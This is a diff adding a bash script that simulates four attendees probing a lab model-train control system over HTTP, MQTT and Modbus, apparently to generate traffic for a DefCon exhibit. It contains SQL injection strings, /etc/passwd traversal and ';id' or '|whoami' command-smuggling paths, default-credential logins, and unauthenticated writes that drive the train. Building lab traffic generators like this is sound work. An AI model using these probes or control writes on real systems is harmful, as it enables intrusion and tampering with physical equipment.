@@ -1,0 +1,363 @@
+#!/usr/bin/env bash
+# noise-attendee — 4 simulated DefCon attendees with distinct skill arcs
+#
+# .50  Tourist     — confused, browsing, never finds anything useful
+# .51  Recon Only  — methodical discovery, maps everything, never pulls the trigger
+# .52  Wrong Path  — tries hard, uses real tools, but wrong assumptions every time
+# .53  The One     — does it right: recon → read beacon → find topic → command train
+#
+# Stop with: docker exec choochoo-attacker pkill -f noise-attendee
+
+set -uo pipefail
+
+SUBNET="172.18.0"
+BROKER="${BROKER:-mosquitto}"
+WEB="${WEB:-web-mqtt}"
+CONTROLLER="${CONTROLLER:-controller}"
+MODBUS_HOST="${MODBUS_HOST:-controller}"
+MODBUS_PORT="${MODBUS_PORT:-5020}"
+TRAIN="${TRAIN:-t1}"
+IFACE="eth0"
+
+# Detect which control planes are available at startup
+MQTT_UP=false
+MODBUS_UP=false
+nc -z -w2 "$BROKER" 1883 2>/dev/null && MQTT_UP=true
+nc -z -w2 "$MODBUS_HOST" "$MODBUS_PORT" 2>/dev/null && MODBUS_UP=true
+echo "[noise] MQTT available: $MQTT_UP   Modbus available: $MODBUS_UP"
+
+PERSONAS=(50 51 52 53)
+
+log()       { echo "[noise ${1}] $2"; }
+rnd_sleep() { sleep "$(python3 -c "import random; print(round(random.uniform($1,$2),1))")"; }
+
+# Add virtual IPs
+for last in "${PERSONAS[@]}"; do
+  ip addr add "${SUBNET}.${last}/16" dev "$IFACE" 2>/dev/null || true
+done
+echo "[noise] IPs: ${PERSONAS[*]/#/${SUBNET}.}"
+echo "[noise] 4 personas running. pkill -f noise-attendee to stop."
+echo ""
+
+# ─────────────────────────────────────────────────────────────────────────────
+# .50 — THE TOURIST
+# Plugged in, opened a browser, poked at things, gave up.
+# Generates lots of HTTP noise but never touches MQTT or Modbus.
+# ─────────────────────────────────────────────────────────────────────────────
+persona_tourist() {
+  local IP="${SUBNET}.50"
+  local ROUND=0
+  while true; do
+    ROUND=$((ROUND+1))
+    log "$IP" "Round $ROUND — Tourist"
+
+    # Ping a couple things
+    ping -c 2 -W 1 -I "$IP" "${WEB}" &>/dev/null || true
+    ping -c 1 -W 1 -I "$IP" "${BROKER}" &>/dev/null || true
+    rnd_sleep 1 3
+
+    # Just browses the web UI — no idea what they're looking at
+    curl -s -o /dev/null --interface "$IP" "http://${WEB}:8000/" || true
+    rnd_sleep 1 4
+
+    # Tries random web paths that make no sense in this context
+    for path in /dashboard /login /index.html /app /home /control /train /api/v1 \
+                /api/v2 /swagger /docs /graphql /metrics /actuator /health; do
+      curl -s -o /dev/null -w "" --interface "$IP" "http://${WEB}:8000${path}" || true
+      rnd_sleep 0.3 1.2
+    done
+
+    # Tries to curl things that aren't HTTP at all
+    curl -s -o /dev/null --interface "$IP" --max-time 2 \
+      "http://${BROKER}:1883/" 2>/dev/null || true
+    curl -s -o /dev/null --interface "$IP" --max-time 2 \
+      "http://${CONTROLLER}:5020/" 2>/dev/null || true
+    rnd_sleep 2 5
+
+    # Pings more hosts looking for something interesting
+    for host in ${SUBNET}.1 ${SUBNET}.10 ${SUBNET}.20 ${SUBNET}.100; do
+      ping -c 1 -W 1 -I "$IP" "$host" &>/dev/null || true
+    done
+
+    # Gives up for a while
+    rnd_sleep 20 40
+  done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# .51 — THE RECON PERSON
+# Excellent at discovery. Finds everything. Writes it all down.
+# Never actually sends a command. Paralysed by analysis.
+# ─────────────────────────────────────────────────────────────────────────────
+persona_recon() {
+  local IP="${SUBNET}.51"
+  local ROUND=0
+  while true; do
+    ROUND=$((ROUND+1))
+    log "$IP" "Round $ROUND — Recon"
+
+    # Proper host discovery
+    nmap -e "$IFACE" -S "$IP" -sn "${SUBNET}.0/24" \
+      --source-port 11111 2>/dev/null | grep -E "report|up" || true
+    rnd_sleep 2 4
+
+    # Service scan on each host they found
+    for host in "${BROKER}" "${WEB}" "${CONTROLLER}"; do
+      nmap -e "$IFACE" -S "$IP" -sV \
+        -p 22,80,443,502,1883,5020,8000,8080,8883,9001 \
+        "$host" --source-port 11111 2>/dev/null | grep -E "open|closed" || true
+      rnd_sleep 1 3
+    done
+
+    # DNS lookups for all names
+    for name in mosquitto controller web broker train gravwell vector; do
+      nslookup "$name" 2>/dev/null | grep -E "^Name|Address" | grep -v "#" || true
+      rnd_sleep 0.3 0.8
+    done
+
+    # Reads the web UI to understand what it is
+    curl -s --interface "$IP" "http://${WEB}:8000/" 2>/dev/null | head -20 || true
+    curl -s --interface "$IP" "http://${WEB}:8000/api/status" 2>/dev/null || true
+    rnd_sleep 1 3
+
+    # Subscribes to everything on MQTT — just to see, not to act
+    if $MQTT_UP; then
+      mosquitto_sub -A "$IP" -h "$BROKER" -p 1883 -t "#" -C 15 -W 5 2>/dev/null || true
+      rnd_sleep 2 4
+
+      # Subscribes to specific topics to understand the schema
+      for topic in "choochoo/#" \
+                   "choochoo/train/#" \
+                   "choochoo/train/${TRAIN}/discovery" \
+                   "choochoo/train/${TRAIN}/state" \
+                   "choochoo/train/${TRAIN}/cmd/+"; do
+        mosquitto_sub -A "$IP" -h "$BROKER" -p 1883 -t "$topic" -C 2 -W 2 2>/dev/null || true
+        rnd_sleep 0.5 1.5
+      done
+    fi
+
+    # Modbus register map read — full enumeration (if controller is up)
+    if $MODBUS_UP; then
+      /opt/attack/bin/python3 - <<PY 2>/dev/null || true
+import asyncio
+from pymodbus.client import AsyncModbusTcpClient
+
+async def go():
+    c = AsyncModbusTcpClient("${MODBUS_HOST}", port=${MODBUS_PORT})
+    await c.connect()
+    await c.read_holding_registers(0, count=4)
+    await c.read_input_registers(0, count=2)
+    await c.read_coils(0, count=1)
+    await c.read_discrete_inputs(0, count=2)
+    # Just reads. Never writes. Too busy taking notes.
+    c.close()
+
+asyncio.run(go())
+PY
+      rnd_sleep 2 4
+    fi
+
+    # Goes back and subscribes again — still just watching
+    if $MQTT_UP; then
+      mosquitto_sub -A "$IP" -h "$BROKER" -p 1883 -t "#" -C 10 -W 5 2>/dev/null || true
+    fi
+
+    # Long pause — "still mapping things out"
+    rnd_sleep 25 50
+  done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# .52 — THE WRONG PATH
+# Technically capable but wrong assumptions at every turn.
+# Tries SQLi, tries default creds, publishes to wrong topics,
+# sends malformed payloads. Real effort, zero results.
+# ─────────────────────────────────────────────────────────────────────────────
+persona_wrong_path() {
+  local IP="${SUBNET}.52"
+  local ROUND=0
+  while true; do
+    ROUND=$((ROUND+1))
+    log "$IP" "Round $ROUND — Wrong Path"
+
+    # SQL injection on the web UI (this is a train controller, not a DB-backed app)
+    for payload in \
+      "' OR 1=1--" \
+      "admin'--" \
+      "1; DROP TABLE trains--" \
+      "%27%20OR%20%271%27%3D%271"; do
+      curl -s -o /dev/null --interface "$IP" \
+        "http://${WEB}:8000/api/status?id=${payload}" || true
+      rnd_sleep 0.3 0.8
+    done
+    rnd_sleep 1 2
+
+    # Tries to authenticate with default credentials (broker has no auth)
+    mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+      -u "admin" -P "admin" \
+      -t "test" -m "hello" 2>/dev/null || true
+    mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+      -u "admin" -P "password" \
+      -t "test" -m "hello" 2>/dev/null || true
+    mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+      -u "root" -P "root" \
+      -t "test" -m "hello" 2>/dev/null || true
+    rnd_sleep 1 2
+
+    # Publishes to completely wrong MQTT topics
+    for topic in \
+      "train/motor" \
+      "motor/power" \
+      "cmd/train" \
+      "control/train/t1" \
+      "lego/train/motor" \
+      "/train/t1/cmd" \
+      "home/train/t1/motor"; do
+      mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+        -t "$topic" -m '{"power":100}' 2>/dev/null || true
+      rnd_sleep 0.2 0.6
+    done
+    rnd_sleep 1 2
+
+    # Publishes to the RIGHT topic but with malformed payloads
+    mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+      -t "choochoo/train/${TRAIN}/cmd/motor" \
+      -m 'power=100' 2>/dev/null || true           # not JSON
+    mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+      -t "choochoo/train/${TRAIN}/cmd/motor" \
+      -m '{"speed":100}' 2>/dev/null || true        # wrong key
+    mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+      -t "choochoo/train/${TRAIN}/cmd/motor" \
+      -m '{"power":"fast"}' 2>/dev/null || true     # wrong type
+    mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+      -t "choochoo/train/${TRAIN}/cmd/motor" \
+      -m '{"power":100,"speed":100}' 2>/dev/null || true  # extra keys
+    rnd_sleep 1 3
+
+    # Tries path traversal on the HTTP API
+    for path in \
+      "/../etc/passwd" \
+      "/api/../../../etc/passwd" \
+      "/api/motor;id" \
+      "/api/motor|whoami"; do
+      curl -s -o /dev/null --interface "$IP" \
+        "http://${WEB}:8000${path}" || true
+      rnd_sleep 0.2 0.5
+    done
+    rnd_sleep 1 2
+
+    # Tries Modbus but uses wrong unit ID and register ranges
+    if $MODBUS_UP; then
+      /opt/attack/bin/python3 - <<PY 2>/dev/null || true
+import asyncio
+from pymodbus.client import AsyncModbusTcpClient
+
+async def go():
+    c = AsyncModbusTcpClient("${MODBUS_HOST}", port=${MODBUS_PORT})
+    await c.connect()
+    # Wrong register — tries HR 100+ (doesn't exist)
+    await c.read_holding_registers(100, count=10)
+    # Tries to write to an input register (read-only — always fails)
+    await c.write_register(1, 99)   # IR[1] is MAX_POWER, read-only
+    c.close()
+
+asyncio.run(go())
+PY
+      rnd_sleep 2 4
+    fi
+
+    rnd_sleep 15 30
+  done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# .53 — THE ONE WHO GETS IT
+# Reads the room, finds the beacon, understands the schema,
+# sends valid commands. Train actually responds.
+# ─────────────────────────────────────────────────────────────────────────────
+persona_success() {
+  local IP="${SUBNET}.53"
+  local ROUND=0
+  while true; do
+    ROUND=$((ROUND+1))
+    log "$IP" "Round $ROUND — The One"
+
+    # Step 1: Identify the network
+    nmap -e "$IFACE" -S "$IP" -sT \
+      -p 1883,8000,5020 "${BROKER}" "${WEB}" "${CONTROLLER}" \
+      --source-port 55555 2>/dev/null | grep "open" || true
+    rnd_sleep 2 4
+
+    # Step 2: Dump broker — read the discovery beacon
+    mosquitto_sub -A "$IP" -h "$BROKER" -p 1883 -t "#" -C 5 -W 3 2>/dev/null || true
+    rnd_sleep 1 2
+
+    # Step 3: Read the discovery beacon specifically — get the cmd_topic
+    mosquitto_sub -A "$IP" -h "$BROKER" -p 1883 \
+      -t "choochoo/train/${TRAIN}/discovery" -C 1 -W 2 2>/dev/null || true
+    rnd_sleep 1 2
+
+    # Step 4: Check current state
+    mosquitto_sub -A "$IP" -h "$BROKER" -p 1883 \
+      -t "choochoo/train/${TRAIN}/state" -C 1 -W 2 2>/dev/null || true
+    rnd_sleep 1 2
+
+    # Step 5: Send a valid motor command — forward at moderate speed
+    mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+      -t "choochoo/train/${TRAIN}/cmd/motor" \
+      -m '{"power": 60, "direction": "forward"}' 2>/dev/null || true
+    log "$IP" "Sent motor command — train should move"
+    rnd_sleep 4 8
+
+    # Step 6: Change speed
+    mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+      -t "choochoo/train/${TRAIN}/cmd/motor" \
+      -m '{"power": 30, "direction": "forward"}' 2>/dev/null || true
+    rnd_sleep 3 5
+
+    # Step 7: Stop the train cleanly
+    mosquitto_pub -A "$IP" -h "$BROKER" -p 1883 \
+      -t "choochoo/train/${TRAIN}/cmd/motor" \
+      -m '{"power": 0}' 2>/dev/null || true
+    log "$IP" "Stopped train"
+    rnd_sleep 2 4
+
+    # Step 8: HTTP API is also a valid attack surface but skipped here to avoid
+    # interfering with real operator commands during a live event.
+
+    # Step 9: Modbus path — read register map, then write motor power
+    if $MODBUS_UP; then
+      /opt/attack/bin/python3 - <<PY 2>/dev/null || true
+import asyncio
+from pymodbus.client import AsyncModbusTcpClient
+
+async def go():
+    c = AsyncModbusTcpClient("${MODBUS_HOST}", port=${MODBUS_PORT})
+    await c.connect()
+    # Recon first: read MAX_POWER from IR[1] to know the ceiling
+    ir = await c.read_input_registers(0, count=2)
+    max_power = ir.registers[1] if not ir.isError() else 50
+    # Write motor power at 60% of max — valid, within bounds
+    target = min(int(max_power * 0.6), max_power)
+    await c.write_register(0, target)
+    # Let it run, then stop
+    await c.write_register(0, 0)
+    c.close()
+
+asyncio.run(go())
+PY
+      rnd_sleep 4 8
+    fi
+
+    # Long pause — satisfied, watching the train
+    rnd_sleep 30 60
+  done
+}
+
+# ── Launch all 4 in parallel ──────────────────────────────────────────────────
+persona_tourist     &
+persona_recon       &
+persona_wrong_path  &
+persona_success     &
+
+wait
